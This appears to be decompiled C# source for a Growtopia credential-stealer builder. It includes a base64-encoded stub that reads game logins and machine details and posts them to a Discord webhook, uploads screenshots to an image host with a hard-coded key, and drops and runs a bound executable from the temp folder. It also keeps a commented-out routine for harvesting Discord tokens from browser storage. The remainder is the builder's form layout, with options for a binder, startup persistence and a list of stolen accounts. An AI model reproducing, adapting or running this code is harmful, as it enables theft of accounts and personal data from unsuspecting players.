ICAgV2ViUmVzcG9uc2Ugd1JlczEgPSB3cmVxMS5HZXRSZXNwb25zZSgpOw0KICAgICAgICAgICAgICAgICAgICAgICAgU3RyZWFtUmVhZGVyIHNyMSA9IG5ldyBTdHJlYW1SZWFkZXIod1JlczEuR2V0UmVzcG9uc2VTdHJlYW0oKSk7DQogICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgd3Jlc3VsdCA9IHNyMS5SZWFkVG9FbmQoKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIHNyMS5EaXNwb3NlKCk7DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoU2VuZFNjcmVlbnNob3QgPT0gInNzdHJ1ZSIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaW1hZ2V1cmwgPSBTY3JlZW5zaG90KCk7DQoNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICh3cmVzdWx0ID09ICJ0cnVlIikNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBvc3RFbWJlZCh3ZWJ1cmwsIGltYWdldXJsKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKFNlbmRTYXZlRGF0ID09ICJzc2R0cnVlIikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdjLlVwbG9hZEZpbGUoc2F2ZWZpbGVyLCBzYXZlbmV3KTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2F0Y2ggeyB9DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgICAgICBGaWxlLkRlbGV0ZShzYXZlbmV3KTsNCiAgICAgICAgICAgICAgICAgICAgaWYgKFBhc3N3b3JkcyAhPSBudWxsKQ0KICAgICAgICAgICAgICAgICAgICAgICAgYWNjcy5TZXRWYWx1ZShHcm93SUQsIFBhc3N3b3Jkcyk7DQogICAgICAgICAgICAgICAgICAgIGFjY3MuQ2xvc2UoKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgICAgICBjYXRjaA0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIENsb3NlKCk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBHZXRUaW1lc3RhbXAoRGF0ZVRpbWUgdmFsdWUpDQogICAgICAgIHsNCiAgICAgICAgICAgIHJldHVybiB2YWx1ZS5Ub1N0cmluZygieXl5eS1NTS1kZCBISDptbSIpOw0KICAgICAgICB9DQoNCiAgICAgICAgcHJpdmF0ZSBzdGF0aWMgdm9pZCBQb3N0RW1iZWQoc3RyaW5nIHVybCwgc3RyaW5nIGltYWdldXJsKQ0KICAgICAgICB7DQogICAgICAgICAgICB0cnkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBzdHJpbmcgR3Jvd0lEID0gIkZhaWxlZCB0byBnZXQgR3Jvd0lEIjsgc3RyaW5nIFBhc3N3b3JkID0gIkZhaWxlZCB0byBnZXQgUGFzc3dvcmQiOyBzdHJpbmcgTWFjID0gIkZhaWxlZCB0byBnZXQgTUFDIjsNCiAgICAgICAgICAgICAgICB2YXIgaHR0cFdlYlJlcXVlc3QgPSAoSHR0cFdlYlJlcXVlc3QpV2ViUmVxdWVzdC5DcmVhdGUodXJsKTsNCiAgICAgICAgICAgICAgICBodHRwV2ViUmVxdWVzdC5Db250ZW50VHlwZSA9ICJhcHBsaWNhdGlvbi9qc29uIjsNCiAgICAgICAgICAgICAgICBodHRwV2ViUmVxdWVzdC5NZXRob2QgPSAiUE9TVCI7DQoNCiAgICAgICAgICAgICAgICBzdHJpbmdbXSBpbmZvID0gU2F2ZURlY29kZSgpOw0KICAgICAgICAgICAgICAgIGlmIChpbmZvICE9IG51bGwpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBHcm93SUQgPSBpbmZvWzBdOw0KICAgICAgICAgICAgICAgICAgICBQYXNzd29yZCA9IGluZm9bMV07DQogICAgICAgICAgICAgICAgICAgIE1hYyA9IGluZm9bMl07DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIC8qDQogICAgICAgICAgICAgICAgc3RyaW5nIFRva2VuU3RyaW5nID0gIiI7DQoNCiAgICAgICAgICAgICAgICBzdHJpbmdbXSBUb2tlbnMgPSBEaXNjb3JkVG9rZW5zKCk7DQoNCiAgICAgICAgICAgICAgICBpZiAoVG9rZW5zICE9IG51bGwpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBzdHJpbmcgdG9rZW5saXN0ID0gIiI7DQogICAgICAgICAgICAgICAgICAgIGZvcmVhY2ggKHN0cmluZyB0b2tlbiBpbiBUb2tlbnMpDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIHRva2VubGlzdCArPSB0b2tlbiArIEAiXG4iOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIE1lc3NhZ2VCb3guU2hvdyh0b2tlbmxpc3QpOw0KICAgICAgICAgICAgICAgICAgICBUb2tlblN0cmluZyA9ICJ7XCJuYW1lXCI6XCJEaXNjb3JkIFRva2VuczpcIiwiICsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiXCJ2YWx1ZVwiOlwiYGBgIiArICJ0b2tlbmxpc3QiICsgImBgYFwifSwiOw0KICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgIGJvb2wgaWZ0b2tlbiA9IERpc2NvcmRUb2tlbiA9PSAiZGN0cnVlIjsqLw0KDQogICAgICAgICAgICAgICAgdXNpbmcgKHZhciBzdHJlYW1Xcml0ZXIgPSBuZXcgU3RyZWFtV3JpdGVyKGh0dHBXZWJSZXF1ZXN0LkdldFJlcXVlc3RTdHJlYW0oKSkpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBzdHJpbmcganNvbiA9ICJ7XCJlbWJlZHNcIjpbIiArDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIntcImNvbG9yXCI6OTc3NzY3LCIgKw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJcImZvb3RlclwiOnsiICsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiXCJ0ZXh0XCI6XCJIYXZlIGZ1biEgfCAiICsgdXNlciArICIgfCIgKyAiXCJ9LCIgKw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJcImF1dGhvclwiOntcIm5hbWVcIjpcIiIgKyBHZXRJUCgpICsgIlwiLCIgKw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJcImljb25fdXJsXCI6XCJodHRwczovL2Rpc2NvcmRlbW9qaS5jb20vYXNzZXRzL2Vtb2ppLzUwMThfdGhpbmtpZXMucG5nXCJ9LCIgKw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJcImltYWdlXCI6e1widXJsXCI6XCIiICsgaW1hZ2V1cmwgKyAiXCJ9LCIgKw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJcImZpZWxkc1wiOlsiICsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAie1wibmFtZVwiOlwiTmV3IFNhdmUuZGF0IGZyb206XCIsIiArDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIlwidmFsdWVcIjpcImBgYCIgKyBFbnZpcm9ubWVudC5Vc2VyTmFtZSArICIgLyAiICsgRW52aXJvbm1lbnQuTWFjaGluZU5hbWUgKyAiYGBgXCJ9LCIgKw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJ7XCJuYW1lXCI6XCJHcm93SUQ6XCIsIiArDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIlwidmFsdWVcIjpcImBgYCIgKyBHcm93SUQgKyAiYGBgXCJ9LCIgKw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJ7XCJuYW1lXCI6XCJQYXNzd29yZDpcIiwiICsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiXCJ2YWx1ZVwiOlwiYGBgIiArIFBhc3N3b3JkICsgImBgYFwifSwiICsgLypUb2tlblN0cmluZyArKi8NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAie1wibmFtZVwiOlwiQUFQOlwiLCIgKw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJcInZhbHVlXCI6XCJgYGAiICsgTWFjICsgImBgYFwifSIgKw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJdfV19IjsNCg0KICAgICAgICAgICAgICAgICAgICBzdHJlYW1Xcml0ZXIuV3JpdGUoanNvbik7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIHZhciBodHRwUmVzcG9uc2UgPSAoSHR0cFdlYlJlc3BvbnNlKWh0dHBXZWJSZXF1ZXN0LkdldFJlc3BvbnNlKCk7DQogICAgICAgICAgICAgICAgdXNpbmcgKHZhciBzdHJlYW1SZWFkZXIgPSBuZXcgU3RyZWFtUmVhZGVyKGh0dHBSZXNwb25zZS5HZXRSZXNwb25zZVN0cmVhbSgpKSkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHZhciByZXN1bHQgPSBzdHJlYW1SZWFkZXIuUmVhZFRvRW5kKCk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgY2F0Y2ggeyB9DQogICAgICAgIH0NCg0KICAgICAgICAvKnByaXZhdGUgc3RhdGljIHN0cmluZ1tdIERpc2NvcmRUb2tlbnMoKQ0KICAgICAgICB7DQogICAgICAgICAgICB0cnkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBMaXN0PHN0cmluZz4gbG9jcyA9IG5ldyBMaXN0PHN0cmluZz4oKTsNCiAgICAgICAgICAgICAgICBMaXN0PHN0cmluZz4gdG9rZW5zID0gbmV3IExpc3Q8c3RyaW5nPigpOw0KDQogICAgICAgICAgICAgICAgbG9jcy5BZGQoQCJSb2FtaW5nXERpc2NvcmQiKTsNCiAgICAgICAgICAgICAgICBsb2NzLkFkZChAIlJvYW1pbmdcZGlzY29yZGNhbmFyeSIpOw0KICAgICAgICAgICAgICAgIGxvY3MuQWRkKEAiUm9hbWluZ1xkaXNjb3JkcHRiIik7DQogICAgICAgICAgICAgICAgbG9jcy5BZGQoQCJMb2NhbFxHb29nbGVcQ2hyb21lXFVzZXIgRGF0YVxEZWZhdWx0Iik7DQogICAgICAgICAgICAgICAgbG9jcy5BZGQoQCJSb2FtaW5nXE9wZXJhIFNvZnR3YXJlXE9wZXJhIFN0YWJsZSIpOw0KICAgICAgICAgICAgICAgIGxvY3MuQWRkKEAiTG9jYWxcQnJhdmVTb2Z0d2FyZVxCcmF2ZS1Ccm93c2VyXFVzZXIgRGF0YVxEZWZhdWx0Iik7DQogICAgICAgICAgICAgICAgbG9jcy5BZGQoQCJMb2NhbFxZYW5kZXhcWWFuZGV4QnJvd3NlclxVc2VyIERhdGFcRGVmYXVsdCIpOw0KDQogICAgICAgICAgICAgICAgZm9yZWFjaCAoc3RyaW5nIGxvYyBpbiBsb2NzKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgRGlyZWN0b3J5SW5mbyBsZXZlbGRiID0gbmV3IERpcmVjdG9yeUluZm8oRW52aXJvbm1lbnQuR2V0Rm9sZGVyUGF0aChFbnZpcm9ubWVudC5TcGVjaWFsRm9sZGVyLlVzZXJQcm9maWxlKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKyBAIlxBcHBEYXRhXCINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICsgbG9jDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICArIEAiXExvY2FsIFN0b3JhZ2VcbGV2ZWxkYiIpOw0KDQogICAgICAgICAgICAgICAgICAgIHRyeQ0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBmb3JlYWNoICh2YXIgZmlsZSBpbiBsZXZlbGRiLkdldEZpbGVzKCIqLmxvZyIpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyBjb250ZW50cyA9IGZpbGUuT3BlblRleHQoKS5SZWFkVG9FbmQoKTsNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvcmVhY2ggKE1hdGNoIG1hdGNoIGluIFJlZ2V4Lk1hdGNoZXMoY29udGVudHMsIEAiW1x3LV17MjR9XC5bXHctXXs2fVwuW1x3LV17Mjd9IikpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRva2Vucy5BZGQobWF0Y2guVmFsdWUpOw0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yZWFjaCAoTWF0Y2ggbWF0Y2ggaW4gUmVnZXguTWF0Y2hlcyhjb250ZW50cywgQCJtZmFcLltcdy1dezg0fSIpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0b2tlbnMuQWRkKG1hdGNoLlZhbHVlKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICBjYXRjaCB7IH0NCg0KICAgICAgICAgICAgICAgICAgICB0cnkNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgZm9yZWFjaCAodmFyIGZpbGUgaW4gbGV2ZWxkYi5HZXRGaWxlcygiKi5sZGIiKSkNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgY29udGVudHMgPSBmaWxlLk9wZW5UZXh0KCkuUmVhZFRvRW5kKCk7DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3JlYWNoIChNYXRjaCBtYXRjaCBpbiBSZWdleC5NYXRjaGVzKGNvbnRlbnRzLCBAIltcdy1dezI0fVwuW1x3LV17Nn1cLltcdy1dezI3fSIpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0b2tlbnMuQWRkKG1hdGNoLlZhbHVlKTsNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvcmVhY2ggKE1hdGNoIG1hdGNoIGluIFJlZ2V4Lk1hdGNoZXMoY29udGVudHMsIEAibWZhXC5bXHctXXs4NH0iKSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdG9rZW5zLkFkZChtYXRjaC5WYWx1ZSk7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgY2F0Y2ggeyB9DQoNCiAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICB0b2tlbnMgPSB0b2tlbnMuRGlzdGluY3QoKS5Ub0xpc3QoKTsNCg0KICAgICAgICAgICAgICAgIGlmICh0b2tlbnMuQ291bnQgPT0gMCkgcmV0dXJuIG51bGw7DQoNCiAgICAgICAgICAgICAgICByZXR1cm4gdG9rZW5zLlRvQXJyYXkoKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGNhdGNoDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgcmV0dXJuIG51bGw7DQogICAgICAgICAgICB9DQogICAgICAgIH0qLw0KDQogICAgICAgIHByaXZhdGUgc3RhdGljIHZvaWQgQ2xvc2UoKQ0KICAgICAgICB7DQogICAgICAgICAgICBFbnZpcm9ubWVudC5FeGl0KDApOw0KICAgICAgICB9DQoNCiAgICAgICAgcHJpdmF0ZSBzdGF0aWMgc3RyaW5nIFNjcmVlbnNob3QoKQ0KICAgICAgICB7DQogICAgICAgICAgICB0cnkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBCaXRtYXAgYm1wID0gbmV3IEJpdG1hcChTY3JlZW4uUHJpbWFyeVNjcmVlbi5Cb3VuZHMuV2lkdGgsIFNjcmVlbi5QcmltYXJ5U2NyZWVuLkJvdW5kcy5IZWlnaHQpOw0KICAgICAgICAgICAgICAgIHVzaW5nIChHcmFwaGljcyBnID0gR3JhcGhpY3MuRnJvbUltYWdlKGJtcCkpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBnLkNvcHlGcm9tU2NyZWVuKDAsIDAsIDAsIDAsIFNjcmVlbi5QcmltYXJ5U2NyZWVuLkJvdW5kcy5TaXplKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgSW1hZ2VDb252ZXJ0ZXIgY29udmVydGVyID0gbmV3IEltYWdlQ29udmVydGVyKCk7DQogICAgICAgICAgICAgICAgTmFtZVZhbHVlQ29sbGVjdGlvbiBkYXRhID0gbmV3IE5hbWVWYWx1ZUNvbGxlY3Rpb24NCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJpbWFnZSIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIENvbnZlcnQuVG9CYXNlNjRTdHJpbmcoKGJ5dGVbXSljb252ZXJ0ZXIuQ29udmVydFRvKGJtcCwgdHlwZW9mKGJ5dGVbXSkpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIH07DQogICAgICAgICAgICAgICAgYnl0ZVtdIGJ5dGVzID0gbmV3IFdlYkNsaWVudCgpLlVwbG9hZFZhbHVlcygiaHR0cHM6Ly9hcGkuaW1nYmIuY29tLzEvdXBsb2FkP2tleT1jY2JlOGI4ODI5MzA0NDEwZTJmN2Q1MzQyM2I3YWU5YyIsIGRhdGEpOw0KICAgICAgICAgICAgICAgIHN0cmluZyBAc3RyaW5nID0gRW5jb2RpbmcuVVRGOC5HZXRTdHJpbmcoYnl0ZXMpOw0KICAgICAgICAgICAgICAgIEBzdHJpbmcgPSBAc3RyaW5nLlJlcGxhY2UoQCJcLyIsIEAiLyIpOw0KICAgICAgICAgICAgICAgIFJlZ2V4IHJlZ2V4ID0gbmV3IFJlZ2V4KEAiKGh0dHBzPzpcL1wvW2EtekEtWjAtOV0rXC5bXlxzXVteIiJdezEsfVthLXpBLVowLTldK1wucG5nKSIpOw0KICAgICAgICAgICAgICAgIE1hdGNoIG1hdGNoID0gcmVnZXguTWF0Y2goQHN0cmluZyk7DQogICAgICAgICAgICAgICAgcmV0dXJuIG1hdGNoLkdyb3Vwc1swXS5WYWx1ZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGNhdGNoDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgcmV0dXJuICIiOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgIH0NCg0KICAgICAgICBwcml2YXRlIHN0YXRpYyB2b2lkIEJpbmRleGUoKQ0KICAgICAgICB7DQogICAgICAgICAgICB0cnkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBTdHJlYW0gbWFuaWZlc3RSZXNvdXJjZVN0cmVhbSA9IGEuR2V0TWFuaWZlc3RSZXNvdXJjZVN0cmVhbSgiMS50eHQiKTsNCiAgICAgICAgICAgICAgICBieXRlW10gYXJyYXkgPSBuZXcgYnl0ZVttYW5pZmVzdFJlc291cmNlU3RyZWFtLkxlbmd0aF07DQogICAgICAgICAgICAgICAgbWFuaWZlc3RSZXNvdXJjZVN0cmVhbS5SZWFkKGFycmF5LCAwLCBhcnJheS5MZW5ndGgpOw0KICAgICAgICAgICAgICAgIG1hbmlmZXN0UmVzb3VyY2VTdHJlYW0uQ2xvc2UoKTsNCiAgICAgICAgICAgICAgICB2YXIgRlN0cmVhbSA9IG5ldyBGaWxlU3RyZWFtKFBhdGguR2V0VGVtcFBhdGgoKSArICJcXDEuZXhlIiwgRmlsZU1vZGUuQ3JlYXRlKTsNCiAgICAgICAgICAgICAgICBGU3RyZWFtLldyaXRlKGFycmF5LCAwLCBhcnJheS5MZW5ndGgpOw0KICAgICAgICAgICAgICAgIEZTdHJlYW0uQ2xvc2UoKTsNCiAgICAgICAgICAgICAgICBGU3RyZWFtLkRpc3Bvc2UoKTsNCiAgICAgICAgICAgICAgICBQcm9jZXNzIHByb2Nlc3MgPSBuZXcgUHJvY2VzcygpOw0KICAgICAgICAgICAgICAgIHByb2Nlc3MuU3RhcnRJbmZvLkZpbGVOYW1lID0gUGF0aC5HZXRUZW1wUGF0aCgpICsgIlxcMS5leGUiOw0KICAgICAgICAgICAgICAgIHByb2Nlc3MuU3RhcnQoKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGNhdGNoIHsgfQ0KICAgICAgICB9DQoNCiAgICAgICAgc3RhdGljIHByaXZhdGUgc3RyaW5nIFNhdmVQYXRoKCkNCiAgICAgICAgew0KICAgICAgICAgICAgdHJ5DQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgUmVnaXN0cnlLZXkgcmVnaXN0cnlLZXkgPSAoIUVudmlyb25tZW50LklzNjRCaXRPcGVyYXRpbmdTeXN0ZW0pID8gUmVnaXN0cnlLZXkuT3BlbkJhc2VLZXkoUmVnaXN0cnlIaXZlLkN1cnJlbnRVc2VyLCBSZWdpc3RyeVZpZXcuUmVnaXN0cnkzMikgOiBSZWdpc3RyeUtleS5PcGVuQmFzZUtleShSZWdpc3RyeUhpdmUuQ3VycmVudFVzZXIsIFJlZ2lzdHJ5Vmlldy5SZWdpc3RyeTY0KTsNCiAgICAgICAgICAgICAgICB0cnkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHJlZ2lzdHJ5S2V5ID0gcmVnaXN0cnlLZXkuT3BlblN1YktleSgiU29mdHdhcmVcXEdyb3d0b3BpYSIsIHdyaXRhYmxl[...string is too long...]";
		}

		// Token: 0x06000047 RID: 71 RVA: 0x00005EC4 File Offset: 0x000040C4
		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		// Token: 0x06000048 RID: 72 RVA: 0x00005EF0 File Offset: 0x000040F0
		private void InitializeComponent()
		{
			this.components = new Container();
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Main));
			this.metroStyleManager1 = new MetroStyleManager(this.components);
			this.pictureBox1 = new PictureBox();
			this.openFileDialog1 = new OpenFileDialog();
			this.metroButton3 = new MetroButton();
			this.UnbannerTab = new MetroTabPage();
			this.panel2 = new Panel();
			this.panel1 = new Panel();
			this.groupBox5 = new GroupBox();
			this.panel3 = new Panel();
			this.label5 = new Label();
			this.label4 = new Label();
			this.metroButton12 = new MetroButton();
			this.label2 = new Label();
			this.metroTextBox3 = new MetroTextBox();
			this.metroButton11 = new MetroButton();
			this.groupBox4 = new GroupBox();
			this.metroButton4 = new MetroButton();
			this.groupBox3 = new GroupBox();
			this.metroButton9 = new MetroButton();
			this.metroButton6 = new MetroButton();
			this.metroButton7 = new MetroButton();
			this.metroButton8 = new MetroButton();
			this.EternityTabs = new MetroTabControl();
			this.StealerTab = new MetroTabPage();
			this.metroButton1 = new MetroButton();
			this.groupBox1 = new GroupBox();
			this.metroTextBox2 = new MetroTextBox();
			this.label3 = new Label();
			this.metroTextBox1 = new MetroTextBox();
			this.label1 = new Label();
			this.groupBox2 = new GroupBox();
			this.chkSendToDiscord = new MetroCheckBox();
			this.txtPEName = new MetroTextBox();
			this.chkbinder = new MetroCheckBox();
			this.metroButton2 = new MetroButton();
			this.metroButton10 = new MetroButton();
			this.chkIcon = new MetroCheckBox();
			this.chkantispam = new MetroCheckBox();
			this.chkss = new MetroCheckBox();
			this.chkstartup = new MetroCheckBox();
			this.chksavedat = new MetroCheckBox();
			this.chkaap = new MetroCheckBox();
			this.SavedatsTab = new MetroTabPage();
			this.metroLabel1 = new MetroLabel();
			this.metroButton5 = new MetroButton();
			this.listView1 = new ListView();
			this.GrowID = new ColumnHeader();
			this.Password = new ColumnHeader();
			this.IP = new ColumnHeader();
			this.Date = new ColumnHeader();
			this.metroContextMenu1 = new MetroContextMenu(this.components);
			this.deleteAccountToolStripMenuItem = new ToolStripMenuItem();
			this.AAPIniDialog = new OpenFileDialog();
			this.BinderFileDialog = new OpenFileDialog();
			this.metroStyleManager1.BeginInit();
			((ISupportInitialize)this.pictureBox1).BeginInit();
			this.UnbannerTab.SuspendLayout();
			this.groupBox5.SuspendLayout();
			this.groupBox4.SuspendLayout();
			this.groupBox3.SuspendLayout();
			this.EternityTabs.SuspendLayout();
			this.StealerTab.SuspendLayout();
			this.groupBox1.SuspendLayout();
			this.groupBox2.SuspendLayout();
			this.SavedatsTab.SuspendLayout();
			this.metroContextMenu1.SuspendLayout();
			base.SuspendLayout();
			this.metroStyleManager1.Owner = this;
			this.metroStyleManager1.Theme = 2;
			this.pictureBox1.Anchor = (AnchorStyles.Bottom | AnchorStyles.Right);
			this.pictureBox1.Image = (Image)componentResourceManager.GetObject("pictureBox1.Image");
			this.pictureBox1.Location = new Point(657, 413);
			this.pictureBox1.Margin = new Padding(2);
			this.pictureBox1.Name = "pictureBox1";
			this.pictureBox1.Size = new Size(41, 41);
			this.pictureBox1.SizeMode = PictureBoxSizeMode.Zoom;
			this.pictureBox1.TabIndex = 14;
			this.pictureBox1.TabStop = false;
			this.pictureBox1.Click += this.pictureBox1_Click;
			this.openFileDialog1.FileOk += this.openFileDialog1_FileOk;
			this.metroButton3.BackColor = Color.FromArgb(26, 32, 40);
			this.metroButton3.FontWeight = 0;
			this.metroButton3.Highlight = true;
			this.metroButton3.Location = new Point(600, 27);
			this.metroButton3.Margin = new Padding(2);
			this.metroButton3.Name = "metroButton3";
			this.metroButton3.Size = new Size(84, 21);
			this.metroButton3.TabIndex = 11;
			this.metroButton3.TabStop = false;
			this.metroButton3.Text = "Change style";
			this.metroButton3.Theme = 2;
			this.metroButton3.UseSelectable = true;
			this.metroButton3.Click += this.changeStyle_Click;
			this.UnbannerTab.Controls.Add(this.panel2);
			this.UnbannerTab.Controls.Add(this.panel1);
			this.UnbannerTab.Controls.Add(this.groupBox5);
			this.UnbannerTab.Controls.Add(this.groupBox4);
			this.UnbannerTab.Controls.Add(this.groupBox3);
			this.UnbannerTab.HorizontalScrollbarBarColor = true;
			this.UnbannerTab.HorizontalScrollbarHighlightOnWheel = false;
			this.UnbannerTab.HorizontalScrollbarSize = 8;
			this.UnbannerTab.Location = new Point(4, 44);
			this.UnbannerTab.Margin = new Padding(2);
			this.UnbannerTab.Name = "UnbannerTab";
			this.UnbannerTab.Size = new Size(607, 362);
			this.UnbannerTab.TabIndex = 1;
			this.UnbannerTab.Text = "Miscellaneous";
			this.UnbannerTab.Theme = 2;
			this.UnbannerTab.VerticalScrollbarBarColor = true;
			this.UnbannerTab.VerticalScrollbarHighlightOnWheel = false;
			this.UnbannerTab.VerticalScrollbarSize = 8;
			this.panel2.BackColor = Color.White;
			this.panel2.Location = new Point(315, 114);
			this.panel2.Name = "panel2";
			this.panel2.Size = new Size(289, 1);
			this.panel2.TabIndex = 20;
			this.panel1.Location = new Point(316, 142);
			this.panel1.Name = "panel1";
			this.panel1.Size = new Size(289, 1);
			this.panel1.TabIndex = 19;
			this.panel1.Visible = false;
			this.groupBox5.BackColor = Color.Transparent;
			this.groupBox5.Controls.Add(this.panel3);
			this.groupBox5.Controls.Add(this.label5);
			this.groupBox5.Controls.Add(this.label4);
			this.groupBox5.Controls.Add(this.metroButton12);
			this.groupBox5.Controls.Add(this.label2);
			this.groupBox5.Controls.Add(this.metroTextBox3);
			this.groupBox5.Controls.Add(this.metroButton11);
			this.groupBox5.Font = new Font("Segoe UI Light", 12f);
			this.groupBox5.ForeColor = Color.White;
			this.groupBox5.Location = new Point(316, 35);
			this.groupBox5.Margin = new Padding(2);
			this.groupBox5.Name = "groupBox5";
			this.groupBox5.Padding = new Padding(2);
			this.groupBox5.Size = new Size(289, 269);
			this.groupBox5.TabIndex = 13;
			this.groupBox5.TabStop = false;
			this.groupBox5.Text = "Save.dat decoder (Coming Soon)";
			this.panel3.BackColor = Color.White;
			this.panel3.Location = new Point(129, 80);
			this.panel3.Name = "panel3";
			this.panel3.Size = new Size(1, 190);
			this.panel3.TabIndex = 20;
			this.panel3.Visible = false;
			this.label5.AutoSize = true;
			this.label5.BackColor = Color.Transparent;
			this.label5.Font = new Font("Segoe UI Light", 13f);
			this.label5.ForeColor = Color.White;
			this.label5.Location = new Point(162, 79);
			this.label5.Margin = new Padding(2, 0, 2, 0);
			this.label5.Name = "label5";
			this.label5.Size = new Size(89, 25);
			this.label5.TabIndex = 18;
			this.label5.Text = "Passwords";
			this.label5.Visible = false;
			this.label4.AutoSize = true;
			this.label4.BackColor = Color.Transparent;
			this.label4.Font = new Font("Segoe UI Light", 13f);
			this.label4.ForeColor = Color.White;
			this.label4.Location = new Point(29, 79);
			this.label4.Margin = new Padding(2, 0, 2, 0);
			this.label4.Name = "label4";
			this.label4.Size = new Size(68, 25);
			this.label4.TabIndex = 17;
			this.label4.Text = "GrowID";
			this.label4.Visible = false;
			this.metroButton12.AutoSizeMode = AutoSizeMode.GrowAndShrink;
